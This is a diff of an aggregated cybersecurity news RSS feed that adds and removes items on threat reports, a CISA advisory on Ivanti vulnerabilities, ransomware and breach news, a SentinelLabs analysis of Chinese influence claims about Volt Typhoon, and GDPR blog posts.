+&lt;p&gt;This presentation was featured live at &lt;a href="https://www.labscon.io/" rel="noopener noreferrer" target="_blank"&gt;LABScon&lt;/a&gt; 2024, an immersive 3-day conference bringing together the world’s top cybersecurity minds, hosted by SentinelOne’s research arm, SentinelLabs.&lt;/p&gt;
+&lt;p&gt;Keep up with all the latest on &lt;a href="https://www.labscon.io/" rel="noopener noreferrer" target="_blank"&gt;LABScon 2025&lt;/a&gt; here.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&amp;p=111725</guid><category>LABScon</category><category>labscon24</category></item><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Examining Redtail Analyzing a Sophisticated Cryptomining Malware and its Advanced Tactics &amp;#x5b;Guest Diary&amp;#x5d;</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>The School Shootings Were Fake. The Terror Was Real</title><link>https://www.wired.com/school-swatting-torswats-brad-dennis/</link><description>The inside story of the teenager whose “swatting” calls sent armed police racing into hundreds of schools nationwide—and the private detective who tracked him down.</description><guid isPermaLink="false">6753615057a0763b2c34c432</guid><category>The Big Story</category><category>Security</category><category>longreads</category><category>Crime</category><category>cybersecurity</category><category>FBI</category><category>Telegram</category><category>Discord</category><category>Lord of the Rings</category><category>Twitch</category><category>video games</category><category>Police</category><category>Last Call</category></item><item><title>Examining Redtail Analyzing a Sophisticated Cryptomining Malware and its Advanced Tactics &amp;#x5b;Guest Diary&amp;#x5d;, (Thu, Jan 9th)</title><link>https://isc.sans.edu/diary/rss/31568</link><description>&lt;p&gt;&amp;#x5b;This is a Guest Diary by Cody Hales, an ISC intern as part of the SANS.edu &lt;a href="https://www.sans.edu/cyber-security-programs/bachelors-degree/"&gt;BACS&lt;/a&gt; program&amp;#x5d;&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;[This is a Guest Diary by Cody Hales, an ISC intern as part of the SANS.edu &lt;a href="https://www.sans.edu/cyber-security-programs/bachelors-degree/"&gt;BACS&lt;/a&gt; program]&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;&lt;span style="font-size: 16px;"&gt;Introduction&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
 
@@ -561,7 +1315,8 @@ gbruneau at isc dot sans dot edu&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/7-steps-to-highly-effective-gdpr-compliance"&gt;Step-by-Step Guide to Achieving GDPR Compliance&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance UK Blog&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.itgovernance.co.uk/blog/?p=38901</guid><category>Data Protection</category><category>GDPR</category></item><item><title>IBM’s Acquisition of HashiCorp Investigated by UK Competition Authority</title><link>https://www.techrepublic.com/article/ibm-hashicorp-merger-investigated-uk/</link><description>HashiCorp provides hybrid and multi-cloud lifecycle management products that could assist IBM’s customers with their AI ambitions.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4283329</guid><category>Artificial Intelligence</category><category>Cloud</category><category>International</category><category>Microsoft</category><category>Software</category><category>United Kingdom</category><category>cloud</category><category>competition and markets authority</category><category>hashicorp</category><category>ibm</category><category>legislation</category><category>mergers and acquisitions</category><category>regulation</category><category>uk</category></item><item><title>Ivanti Releases Security Updates for Connect Secure, Policy Secure, and ZTA Gateways</title><link>https://www.cisa.gov/news-events/alerts/2025/01/08/ivanti-releases-security-updates-connect-secure-policy-secure-and-zta-gateways</link><description>&lt;p&gt;Ivanti released security updates to address vulnerabilities (CVE-2025-0282, CVE-2025-0283) in Ivanti Connect Secure, Policy Secure, and ZTA Gateways. A cyber threat actor could exploit CVE-2025-0282 to take control of an affected system.&lt;br /&gt;&lt;br /&gt;CISA has added CVE-2025-0282 to its&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities Catalog"&gt;Known Exploited Vulnerabilities Catalog&lt;/a&gt;, based on evidence of active exploitation.&lt;/p&gt;
 &lt;p&gt;CISA urges organizations to hunt for any malicious activity, report any positive findings to CISA, and review the following for more information:&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-Policy-Secure-ZTA-Gateways-CVE-2025-0282-CVE-2025-0283"&gt;Security Advisory Ivanti Connect Secure, Policy Secure &amp;amp; ZTA Gateways (CVE-2025-0282, CVE-2025-0283)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-Policy-Secure-ZTA-Gateways-CVE-2025-0282-CVE-2025-0283"&gt;Ivanti: Security Advisory Ivanti Connect Secure, Policy Secure &amp;amp; ZTA Gateways (CVE-2025-0282, CVE-2025-0283)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day"&gt;Mandiant: Ivanti Connect Secure VPN Targeted in New Zero-Day Exploitation&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;&lt;br /&gt;For all instances of Ivanti Connect Secure, Policy Secure, and ZTA Gateways, see the following steps for general hunting guidance:&lt;/p&gt;
 &lt;ol&gt;
@@ -13248,41 +14003,7 @@ with the help of ImgDat." src="https://research.checkpoint.com/wp-content/upload
 &lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2024/massive-phishing-campaign-deploys-latest-rhadamanthys-version/"&gt;CopyRh(ight)adamantys Campaign: Rhadamantys Exploits Intellectual Property Infringement Baits&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=30726</guid><category>Check Point Research Publications</category></item><item><title>Revolutionizing Risk Management in Application Security</title><link>https://www.veracode.com/blog/intro-appsec/revolutionizing-risk-management-application-security</link><description>In our hyper-connected reality, software applications are the unsung heroes of business operations. But, let's face it, with great tech comes great vulnerability to cyber shakedowns and data leaks. This begs the question: “Is scanning enough to manage risk?” Organizations are playing a high-stakes game of keeping their apps secure to safeguard their secrets. Let’s explore how to enhance application security by not only identifying vulnerabilities but also by prioritizing these threats, giving teams a playbook with the Next Best Actions to understand the root cause analysis of flaws and tackling them head-on.  
 The Challenge: Prioritizing and Remediating Vulnerabilities for Application Risk Management at Scale 
 Have you ever asked yourself, "What flaws do I fix first? Where is the issue originating from? I have hundreds, perhaps thousands of vulnerabilities, how many different point solutions do I have to go through to figure all of this out?"
-Questions like…</description><guid isPermaLink="false">https://www.veracode.com/ver66981</guid></item><item><title>4th November – Threat Intelligence Report</title><link>https://research.checkpoint.com/2024/4th-november-threat-intelligence-report/</link><description>&lt;p&gt;For the latest discoveries in cyber research for the week of 4th November, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Free, the second-largest telecom company in France, has been hit by a cyberattack resulting in unauthorized access to personal data associated with certain subscriber accounts. The incident surfaced following an attempted sale [&amp;#8230;]&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2024/4th-november-threat-intelligence-report/"&gt;4th November – Threat Intelligence Report&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;For the latest discoveries in cyber research for the week of 4th November, please download our &lt;a href="https://research.checkpoint.com/wp-content/uploads/2024/11/Threat_Intelligence_News_2024-11-04-1.pdf"&gt;Threat Intelligence Bulletin&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Free, the second-largest telecom company in France, has been &lt;a href="https://thecyberexpress.com/free-cyberattack-confirmed/"&gt;hit&lt;/a&gt; by a cyberattack resulting in unauthorized access to personal data associated with certain subscriber accounts. The incident surfaced following an attempted sale of stolen customer data on a cybercrime forum, impacting potentially up to 19 million customers. Although passwords and bank details were not compromised, Free is alerting affected users and has filed a complaint with local authorities.&lt;/li&gt;
-&lt;li&gt;The San Joaquin County Superior Court has been &lt;a href="https://therecord.media/california-court-suffering-from-tech-outages-cyberattack"&gt;impacted&lt;/a&gt; by a cyberattack resulting in widespread technical outages. The incident has disrupted access to court services, including public-facing applications and internal operations, affecting case management and public record systems.&lt;/li&gt;
-&lt;li&gt;AEP, a German pharmaceutical wholesaler, &lt;a href="https://www.br.de/nachrichten/bayern/cyberattacke-auf-pharmagrosshaendler-lieferprobleme-fuer-apotheken,UShteGL"&gt;suffered&lt;/a&gt; a ransomware attack leading to partial encryption of its IT systems, impacting medicine supplies to over 6,000 pharmacies. The company, headquartered in Bavaria, has disconnected affected systems and is working with external cybersecurity experts to address the incident.&lt;/li&gt;
-&lt;li&gt;The Housing Authority of the City of Los Angeles (HACLA) has been &lt;a href="https://therecord.media/hacla-los-angeles-second-ransomware-attack"&gt;targeted&lt;/a&gt; in a ransomware attack, with the Cactus ransomware gang claiming responsibility and alleging data theft of 861 GB, including personal, financial, and backup information. This incident marks the second cyberattack HACLA has faced in recent years, following an earlier breach by LockBit in 2023.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point Harmony Endpoint and Threat Emulation provide protection against this threat&lt;/em&gt; &lt;em&gt;(Ransomware.Wins.Cactus.ta.*, Ransomware.Win.Cactus.*)&lt;/em&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Pro-Ukraine hacktivists “Ukrainian Cyber Alliance” allegedly &lt;a href="https://therecord.media/ukraine-cyberattack-russia-parking-tver"&gt;launched&lt;/a&gt; a cyberattack on the parking payment system in Tver, Russia, as part of ongoing digital assaults amidst the conflict. The attack disrupted the city&amp;#8217;s payment infrastructure, allowing residents to park for free for nearly two days.&lt;/li&gt;
-&lt;li&gt;The French Ministry of Labor and Employment has &lt;a href="https://travail-emploi.gouv.fr/un-prestataire-des-missions-locales-victime-dun-acte-de-cyber-malveillance"&gt;reported&lt;/a&gt; a cyberattack on a service provider for its Local Missions network, which supports individuals aged 16 to 25 with employment and training. The breach, which occurred in October 2024, potentially exposed personal data, including names, birthdates, nationalities, and contact information, of young people registered in the program. Financial details, social security numbers, and identity documents were not compromised.&lt;/li&gt;
-&lt;li&gt;Interbank, a major Peruvian financial institution, &lt;a href="https://www.bleepingcomputer.com/news/security/interbank-confirms-data-breach-following-failed-extortion-data-leak/"&gt;suffered&lt;/a&gt; a data breach in which sensitive customer data, including financial information, was reportedly exposed. The breach led to the unauthorized disclosure of personally identifiable information and account details. Investigations are ongoing to determine the extent of the compromised information and potential vulnerabilities exploited.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Synology &lt;a href="https://www.synology.com/en-us/security/advisory/Synology_SA_24_19"&gt;addressed&lt;/a&gt; two critical zero-day vulnerabilities (tracked together as CVE-2024-10443) &lt;a href="https://www.midnightblue.nl/research/riskstation"&gt;discovered&lt;/a&gt; during the recent Pwn2Own Ireland 2024 competition. The flaws, dubbed RISK:STATION, affected Synology Photos and BeePhotos software and could allow remote code execution on exposed NAS devices. Patches were released within 48 hours due to the high risk of exploitation, urging users to update to secure their systems.&lt;/li&gt;
-&lt;li&gt;QNAP has &lt;a href="https://www.bleepingcomputer.com/news/security/qnap-patches-second-zero-day-exploited-at-pwn2own-to-get-root/"&gt;patched&lt;/a&gt; a critical zero-day SQL injection vulnerability (CVE-2024-50387), in its SMB Service, discovered at Pwn2Own Ireland 2024. The vulnerability was patched within a week, with updates available in SMB Service version 4.15.002 or later.&lt;/li&gt;
-&lt;li&gt;A critical vulnerability in the AI Power Complete AI Pack WordPress plugin (CVE-2024-10392) is &lt;a href="https://www.wordfence.com/blog/2024/10/10000-wordpress-sites-affected-by-arbitrary-file-upload-vulnerability-in-ai-power-complete-ai-pack-wordpress-plugin/"&gt;affecting&lt;/a&gt; approximately 10,000 WordPress websites. The flaw enables arbitrary file uploads, potentially allowing attackers to execute code on vulnerable sites.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Check Point Research has &lt;a href="https://blog.checkpoint.com/research/ransomwares-evolving-threat-the-rise-of-ransomhub-decline-of-lockbit-and-the-new-era-of-data-extortion/"&gt;published&lt;/a&gt; its September 2024 ransomware report, highlighting emerging trends in ransomware. Noted are the rapid rise of RansomHub, which accounted for 19% of ransomware victims this month, and a shift by groups like Meow towards data extortion over encryption. The report also shows Lockbit’s decline in activity, following law enforcement actions.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point Harmony Endpoint and Threat Emulation provide protection against this threat&lt;/em&gt; &lt;em&gt;(Ransomware.Win.RansomHub; Ransomware.Wins.RansomHub.ta.*)&lt;/em&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;The FBI, U.S. Treasury, and Israel National Cyber Directorate have &lt;a href="https://www.ic3.gov/CSA/2024/241030.pdf"&gt;issued&lt;/a&gt; joint advisory detailing updated tactics by the Iranian group Emennet Pasargad, also known as Aria Sepehr Ayandehsazan (ASA). This group, active in influence operations targeting events like the 2024 Summer Olympics, has utilized advanced methods such as fictitious hosting resellers, IP camera content harvesting, and interest in AI resources for cyber-enabled information operations.&lt;/li&gt;
-&lt;li&gt;Researchers have &lt;a href="https://news.sophos.com/en-us/2024/10/31/pacific-rim-neutralizing-china-based-threat/"&gt;conducted&lt;/a&gt; a five-year investigation into multiple China-based APT groups, including Volt Typhoon, APT31, and APT41/Winnti, focusing on their sophisticated attacks against Sophos network perimeter devices. The threat actors developed and deployed advanced TTPs, such as rootkits, UEFI bootkits, and backdoored Java classes, to compromise devices and target high-value entities in the Indo-Pacific, including government and critical infrastructure sectors.&lt;/li&gt;
-&lt;li&gt;Researchers have &lt;a href="https://www.microsoft.com/en-us/security/blog/2024/10/31/chinese-threat-actor-storm-0940-uses-credentials-from-password-spray-attacks-from-a-covert-network/"&gt;identified&lt;/a&gt; that the Chinese threat actor, Storm-0940, has been using stolen credentials obtained through password spray attacks to access targeted systems. The actor operates through a covert network to obfuscate its activities, enabling access to sensitive data across various sectors. This campaign highlights the persistent and sophisticated approach of Storm-0940 in leveraging credential-based tactics.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2024/4th-november-threat-intelligence-report/"&gt;4th November – Threat Intelligence Report&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=30741</guid><category>Global Cyber Attack Reports</category></item><item><title>How Organisations Are Failing to Process Personal Data Lawfully Under the GDPR</title><link>https://www.itgovernance.co.uk/blog/how-organisations-are-failing-to-process-personal-data-lawfully-under-the-gdpr</link><description>&lt;p&gt;Problems with consent, purpose limitation, retention periods, and more At the heart of the GDPR (General Data Protection Regulation) lie the Article 5 data protection principles. When I asked data privacy trainer and DPO (data protection officer) Andy Snow which principle organisations are most prone to getting wrong, he found it hard to pick just one. In part, this is due to how the principles naturally interlink – an issue with one principle naturally leads to issues with (some of) the others, too. Andy took the first principle as an example, saying: You’d think organisations can get something as basic &lt;/p&gt;
+Questions like…</description><guid isPermaLink="false">https://www.veracode.com/ver66981</guid></item><item><title>How Organisations Are Failing to Process Personal Data Lawfully Under the GDPR</title><link>https://www.itgovernance.co.uk/blog/how-organisations-are-failing-to-process-personal-data-lawfully-under-the-gdpr</link><description>&lt;p&gt;Problems with consent, purpose limitation, retention periods, and more At the heart of the GDPR (General Data Protection Regulation) lie the Article 5 data protection principles. When I asked data privacy trainer and DPO (data protection officer) Andy Snow which principle organisations are most prone to getting wrong, he found it hard to pick just one. In part, this is due to how the principles naturally interlink – an issue with one principle naturally leads to issues with (some of) the others, too. Andy took the first principle as an example, saying: You’d think organisations can get something as basic &lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/how-organisations-are-failing-to-process-personal-data-lawfully-under-the-gdpr"&gt;How Organisations Are Failing to Process Personal Data Lawfully Under the GDPR&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance UK Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;Problems with consent, purpose limitation, retention periods, and more&lt;/h2&gt;
 
 
@@ -14870,32 +15591,7 @@ The strategy began with a structured onboarding process for developers onto the 
 
 
 &lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2024/10/17/10-steps-to-safeguarding-your-privacy-online/" rel="nofollow"&gt;10 steps to safeguarding your privacy online&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.webroot.com/blog/?p=33427</guid><category>Threat Lab</category><category>cyber resilience</category><category>data breach</category><category>phishing</category><category>privacy</category></item><item><title>Staff Stories Spotlight Series: Cybersecurity Awareness Month 2024</title><link>https://www.nist.gov/blogs/cybersecurity-insights/staff-stories-spotlight-series-cybersecurity-awareness-month-2024-4</link><description>This blog is part of a larger NIST series during the month of October for Cybersecurity Awareness Month , called 'Staff Stories Spotlight.' Throughout the month of October this year, Q&amp;amp;A style blogs will be published featuring some of our unique staff members who have interesting backgrounds, stories to tell, and projects in the world of cybersecurity. This year’s Cybersecurity Awareness Month theme is ‘Secure our World.’ How does this theme resonate with you, as someone working in cybersecurity? Everyone has the power to protect information. Like safety – where everyone’s responsibility is to</description><guid isPermaLink="false">https://www.nist.gov/node/1861666</guid></item><item><title>How to Mitigate the Impact of Rogue AI Risks</title><link>https://www.trendmicro.com/en_us/research/24/j/mitigate-rogue-ai-risks.html</link><description>This is the latest blog in an ongoing series on Rogue AI. Keep following for more technical guidance, case studies, and insights.</description><guid isPermaLink="false">urn:uuid:d1387812-8ed6-a7f4-ba17-6d867ccb4f92</guid><category>Trend Micro Research : Cloud</category><category>Trend Micro Research : Cyber Crime</category><category>Trend Micro Research : Artificial Intelligence (AI)</category><category>Trend Micro Research : Expert Perspective</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Cyber Threats</category></item><item><title>China’s Influence Ops | Twisting Tales of Volt Typhoon at Home and Abroad</title><link>https://www.sentinelone.com/labs/chinas-influence-ops-twisting-tales-of-volt-typhoon-at-home-and-abroad/</link><description>China's CVERC attempts to attribute Volt Typhoon activities to the U.S., but the fact-free claims reveal much about the PRC's real agenda.</description><content:encoded>&lt;h2&gt;Executive Summary&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;The latest CVERC report reflects China&amp;#8217;s ongoing efforts to undermine support for U.S. surveillance activities by attempting to fuel debate over Section 702.&lt;/li&gt;
-&lt;li&gt;The CVERC report also draws Microsoft into its crosshairs as part of an ongoing push to remove foreign technology from PRC government systems.&lt;/li&gt;
-&lt;li&gt;The report highlights previous intelligence from France and Germany regarding U.S spying in an attempt to deflect attention away from recent incidents of Chinese espionage in Europe, likely as a means to shape narratives amid ongoing political debates.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2&gt;Introduction&lt;/h2&gt;
-&lt;p&gt;China’s Computer Virus Emergency Response Center has released part three of a running series claiming that the U.S. government is actually behind Volt Typhoon activity, rather than China. &lt;a href="https://www.globaltimes.cn/page/202410/1321156.shtml" rel="noopener noreferrer" target="_blank"&gt;The latest CVERC report&lt;/a&gt;, whose front page includes an oddly edited photo with the text “Lie to Me,” provides no new evidence of these claims and rehashes old leaked U.S. intelligence documents. However, this CVERC report is not useless.&lt;/p&gt;
-&lt;p&gt;The CVERC report tells us more about China’s intentions than it does convince readers of the PRC’s claims about Volt Typhoon. &lt;a href="https://www.sentinelone.com/labs/chinas-cyber-revenge-why-the-prc-fails-to-back-its-claims-of-western-espionage/" rel="noopener noreferrer" target="_blank"&gt;SentinelLabs has previously covered the CVERC’s behavior&lt;/a&gt; and is issuing this report to update readers with specific takeaways based on the content of the third edition.&lt;/p&gt;
-&lt;p&gt;In our first report, we highlighted a pattern of coordination between China’s cybersecurity companies, state media, the CVERC, and publications about U.S. hacking operations. We find that the pattern is thus: a cybersecurity company publishes a new report analyzing old leaked documents from the U.S. government, the CVERC picks up the piece and adds analysis–or in many cases, co-authors the report with the company–then state media regurgitate the report in English for international audiences.&lt;/p&gt;
-&lt;p&gt;In some cases, these reports make their way into official PRC government press briefings. In one instance, a PRC embassy abroad re-hosted the report’s content. It is a full court-press to point the finger at U.S. hacking efforts without providing new or substantiated claims.&lt;/p&gt;
-&lt;p&gt;It is clear that such efforts are state-directed, not merely by association of the organizations involved, but by the steady recurring drumbeat of publications. However, such a directive to produce more when there is nothing to be written is hard for writers and researchers. When writers are forced to fill a page count, they inevitably drift towards their own intentions as evidence of their claims run dry. The CVERC’s latest report falls victim to this trap.&lt;/p&gt;
-&lt;p&gt;What follows is our distillation of what we believe analysts can learn from the latest CVERC report about China’s posture in geopolitics, cybersecurity, and hacking operations.&lt;/p&gt;
-&lt;h2&gt;Targeting Section 702&lt;/h2&gt;
-&lt;p&gt;The authors mention &lt;a href="https://www.intel.gov/foreign-intelligence-surveillance-act/1237-fisa-section-702" rel="noopener noreferrer" target="_blank"&gt;Section 702&lt;/a&gt; authorities 13 times across 60 pages, and it is a clear focal point. Compromised devices in the U.S. and abroad constitute the botnets that Chinese operations rely on for obfuscation. Section 702 very likely enables U.S. collection of Chinese activities on these devices that are located in the US. Without Section 702, tracking Chinese hacking operations would be very difficult.&lt;/p&gt;
-&lt;p&gt;However, Section 702 in the United States is controversial. Reviving the 702 debate is clearly in China’s interest and is their intent, as shown by how China highlighted “impacts to ordinary Americans.” No doubt that China hopes a policy move against potent U.S. counterintelligence tools would be in its interest. Will PRC influence ops push such narratives? Already, The Register’s cybersecurity editor &lt;a href="https://www.theregister.com/2024/02/09/fbi_volt_typhoon_section_702/" rel="noopener noreferrer" target="_blank"&gt;wrote a piece&lt;/a&gt; arguing the line that China clearly hoped to promote–that Volt Typhoon is an excuse to continue Section 702.&lt;/p&gt;
-&lt;p&gt;The CVERC publication may be motivated by previous potential Russian successes in changing U.S. policy. Following Russian abuse of leaked NSA vulnerabilities and tools that caused massive economic losses (NotPetya), the U.S. policy community debated the curtailing of these tools. Committees held public hearings and the DNI suggested that if the U.S. could not control such capabilities, perhaps they should not be developed.&lt;/p&gt;
-&lt;p&gt;This period coincides with what Ben Buchanan notes as the &lt;a href="https://www.hoover.org/sites/default/files/research/docs/buchanan_webreadypdf.pdf" rel="noopener noreferrer" target="_blank"&gt;end of the NOBUS era&lt;/a&gt;. The result of Russia’s operations, which were cemented by DPRK bumbling a global ransom op (WannaCry), was the creation of the Vulnerabilities Equities Process (VEP), a process through which the majority of U.S. vulnerabilities discovered are burned and given to their manufacturer. China may hope to achieve a sunset to 702, just as the Russians—intentionally or not—instigated the VEP.&lt;/p&gt;
-&lt;h2&gt;Pushing Foreign Tech Out of China&lt;/h2&gt;
-&lt;p&gt;The CVERC report also draws Microsoft into its crosshairs and tracks the movement of former U.S. government officials to MSFT-related entities. Underpinning CVERC’s concern is &lt;a href="https://www.wsj.com/world/china/china-technology-software-delete-america-2b8ea89f" rel="noopener noreferrer" target="_blank"&gt;CCP Document Number 79&lt;/a&gt;, which pushes for the removal of all foreign technology from PRC government systems. China’s efforts to create its own tech ecosystem, including a domestic operating system, epitomize the effort. CVERC is in no position to signal intent about stopping MSFT’s operations in China.&lt;/p&gt;
-&lt;p&gt;Still, the report suggests the organization is emboldened in its stance on the company. More sure of itself than ever, the CCP seems ready to hit foreign firms that have long remained key IT providers in its ecosystem. Eventually, successful implementation of Document 79 will push MSFT almost entirely from the PRC technology ecosystem.&lt;/p&gt;
-&lt;h2&gt;Shifting the Narrative in Europe&lt;/h2&gt;
-&lt;p&gt;Finally, the CVERC’s mentions of France and Germany arrived at a time of &lt;a href="https://www.gmfus.org/news/watching-china-europe-september-2024" rel="noopener noreferrer" target="_blank"&gt;intense infighting over the future of Europe and its relationship with China&lt;/a&gt;. Until recently, German and French firms had been making hay of U.S. firms leaving the PRC. Buying assets on discount and doubling down with its in-country partners. Now, the sands are shifting.&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://www.bbc.com/news/world-europe-68873836" rel="noopener noreferrer" target="_blank"&gt;Germany arrested Chinese spies&lt;/a&gt; earlier this year. The Dutch &lt;a href="https://www.ncsc.nl/binaries/ncsc/documenten/publicaties/2024/februari/6/mivd-aivd-advisory-coathanger-tlp-clear/TLP-CLEAR+MIVD+AIVD+Advisory+COATHANGER.pdf" rel="noopener noreferrer" target="_blank"&gt;publicly attributed hacking campaigns to China&lt;/a&gt;. In France, the police stopped &lt;a href="https://www.lemonde.fr/en/france/article/2024/07/03/france-asks-two-chinese-spies-to-leave-after-attempt-to-forcibly-repatriate-man_6676591_7.html" rel="noopener noreferrer" target="_blank"&gt;Chinese diplomats from forcibly repatriating a dissident&lt;/a&gt; and asked two PRC spies to leave the country. Who knows what happens behind closed doors in Brussels, but suffice to say that the CVERC doesn’t like what it sees in public.&lt;/p&gt;
-&lt;p&gt;Highlighting what those governments already know about past leaks of USG/FVEY spying is likely aimed at shaping narratives, but says more about CVERC’s intent than anything the report may achieve.&lt;/p&gt;
-&lt;p&gt;As usual, and as SentinelLabs has &lt;a href="https://www.sentinelone.com/labs/chinas-cyber-revenge-why-the-prc-fails-to-back-its-claims-of-western-espionage/" rel="noopener noreferrer" target="_blank"&gt;previously&lt;/a&gt; written, the report is paired with propaganda coverage but, for the first time, has also been published in Japanese, French, and German, in addition to English and Chinese.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&amp;p=107173</guid><category>China</category></item><item><title>Fake LockBit, Real Damage: Ransomware Samples Abuse Amazon S3 to Steal Data</title><link>https://www.trendmicro.com/en_us/research/24/j/fake-lockbit-real-damage-ransomware-samples-abuse-aws-s3-to-stea.html</link><description>This article uncovers a Golang ransomware abusing Amazon S3 for data theft, and masking as LockBit to further pressure victims. The discovery of hard-coded AWS credentials in these samples led to AWS account suspensions.</description><guid isPermaLink="false">urn:uuid:8949ce10-4ab1-cc55-923b-3464cd19ada3</guid><category>Trend Micro Research : Cloud</category><category>Trend Micro Research : Ransomware</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>Staff Stories Spotlight Series: Cybersecurity Awareness Month 2024</title><link>https://www.nist.gov/blogs/cybersecurity-insights/staff-stories-spotlight-series-cybersecurity-awareness-month-2024-1</link><description>This blog is part of a larger NIST series during the month of October for Cybersecurity Awareness Month , called 'Staff Stories Spotlight.' Throughout the month of October this year, Q&amp;amp;A style blogs will be published featuring some of our unique staff members who have interesting backgrounds, stories to tell, and projects in the world of cybersecurity. This year’s Cybersecurity Awareness Month theme is ‘Secure our World.’ How does this theme resonate with you, as someone working in cybersecurity? Now more than ever, the use of technology is central to our lives. It is the means by which we are</description><guid isPermaLink="false">https://www.nist.gov/node/1861391</guid></item><item><title>Silent Threat: Red Team Tool EDRSilencer Disrupting Endpoint Security Solutions</title><link>https://www.trendmicro.com/en_us/research/24/j/edrsilencer-disrupting-endpoint-security-solutions.html</link><description>Trend Micro's Threat Hunting Team has observed EDRSilencer, a red team tool that threat actors are attempting to abuse for its ability to block EDR traffic and conceal malicious activity.</description><guid isPermaLink="false">urn:uuid:1be85902-d0e9-109f-09ba-a6ddef18598b</guid><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Cyber Threats</category><category>Trend Micro Research : Research</category></item><item><title>GDPR: Data Subject Rights and Organisations’ Responsibilities</title><link>https://www.itgovernance.co.uk/blog/what-are-the-data-subject-rights-under-the-gdpr</link><description>&lt;p&gt;The EU GDPR (General Data Protection Regulation) gives individuals eight rights relating to their personal data. Organisations must let individuals know how they can exercise these rights, and meet requests promptly. Failure to do so is a violation of the GDPR and could lead to disciplinary action. But first, what is a data subject?&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2024/10/17/10-steps-to-safeguarding-your-privacy-online/" rel="nofollow"&gt;10 steps to safeguarding your privacy online&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.webroot.com/blog/?p=33427</guid><category>Threat Lab</category><category>cyber resilience</category><category>data breach</category><category>phishing</category><category>privacy</category></item><item><title>Staff Stories Spotlight Series: Cybersecurity Awareness Month 2024</title><link>https://www.nist.gov/blogs/cybersecurity-insights/staff-stories-spotlight-series-cybersecurity-awareness-month-2024-4</link><description>This blog is part of a larger NIST series during the month of October for Cybersecurity Awareness Month , called 'Staff Stories Spotlight.' Throughout the month of October this year, Q&amp;amp;A style blogs will be published featuring some of our unique staff members who have interesting backgrounds, stories to tell, and projects in the world of cybersecurity. This year’s Cybersecurity Awareness Month theme is ‘Secure our World.’ How does this theme resonate with you, as someone working in cybersecurity? Everyone has the power to protect information. Like safety – where everyone’s responsibility is 